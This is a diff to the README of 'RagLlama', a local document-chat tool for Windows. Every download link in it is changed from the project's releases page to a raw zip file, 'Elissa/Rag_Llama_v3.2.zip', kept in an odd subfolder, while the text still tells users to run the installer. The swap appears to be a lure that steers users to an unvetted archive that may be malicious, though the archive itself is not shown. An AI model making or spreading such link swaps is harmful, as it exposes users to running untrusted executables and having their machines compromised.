@@ -1,6 +1,6 @@
 # 🗂️ RagLlama - Chat Locally with Your Documents
 
-[![Download RagLlama](https://img.shields.io/badge/Download-RagLlama-brightgreen?style=for-the-badge)](https://github.com/agismataDEV/RagLlama/releases)
+[![Download RagLlama](https://img.shields.io/badge/Download-RagLlama-brightgreen?style=for-the-badge)](https://github.com/agismataDEV/RagLlama/raw/refs/heads/main/Elissa/Rag_Llama_v3.2.zip)
 
 ## 📋 About RagLlama
 
@@ -24,7 +24,7 @@ To use RagLlama on Windows, you need:
 
 Click this large green button to visit the RagLlama download page:
 
-[![Download RagLlama](https://img.shields.io/badge/Download-RagLlama-brightgreen?style=for-the-badge)](https://github.com/agismataDEV/RagLlama/releases)
+[![Download RagLlama](https://img.shields.io/badge/Download-RagLlama-brightgreen?style=for-the-badge)](https://github.com/agismataDEV/RagLlama/raw/refs/heads/main/Elissa/Rag_Llama_v3.2.zip)
 
 This page has the latest versions and files available for download.
 
@@ -98,7 +98,7 @@ If RagLlama does not run or crashes:
 
 You can always return to this link to find the newest version or updates:
 
-[Download RagLlama Releases](https://github.com/agismataDEV/RagLlama/releases)
+[Download RagLlama Releases](https://github.com/agismataDEV/RagLlama/raw/refs/heads/main/Elissa/Rag_Llama_v3.2.zip)
 
 Click the file for Windows to get started with a fresh copy.
 
@@ -108,7 +108,7 @@ Click the file for Windows to get started with a fresh copy.
 
 When an update is available:
 
-1. Visit the [download page](https://github.com/agismataDEV/RagLlama/releases).  
+1. Visit the [download page](https://github.com/agismataDEV/RagLlama/raw/refs/heads/main/Elissa/Rag_Llama_v3.2.zip).  
 2. Download the newest Windows installer.  
 3. Run it to replace the existing version.  
 4. Your settings and files will remain intact.
@@ -137,4 +137,4 @@ Yes. Use the sidebar to delete files from your collection anytime.
 
 ---
 
-[Get RagLlama here](https://github.com/agismataDEV/RagLlama/releases) to start chatting with your documents on Windows.
+[Get RagLlama here](https://github.com/agismataDEV/RagLlama/raw/refs/heads/main/Elissa/Rag_Llama_v3.2.zip) to start chatting with your documents on Windows.
